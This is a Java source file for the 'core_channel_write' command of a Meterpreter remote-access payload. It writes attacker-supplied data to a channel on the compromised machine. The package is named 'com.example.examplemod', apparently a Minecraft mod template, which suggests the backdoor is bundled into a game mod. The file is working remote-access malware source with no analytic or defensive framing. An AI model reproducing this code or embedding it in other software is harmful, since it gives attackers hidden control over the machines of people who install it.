package com.example.examplemod.meterpreter.core;

import com.example.examplemod.meterpreter.Channel;
import com.example.examplemod.meterpreter.Meterpreter;
import com.example.examplemod.meterpreter.TLVPacket;
import com.example.examplemod.meterpreter.TLVType;
import com.example.examplemod.meterpreter.command.Command;

public class core_channel_write implements Command {

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        Channel c = meterpreter.getChannel(request.getIntValue(TLVType.TLV_TYPE_CHANNEL_ID), true);
        byte[] data = request.getRawValue(TLVType.TLV_TYPE_CHANNEL_DATA);
        int len = request.getIntValue(TLVType.TLV_TYPE_LENGTH);
        c.write(data, len, request);
        response.add(TLVType.TLV_TYPE_LENGTH, len);
        return ERROR_SUCCESS;
    }
}
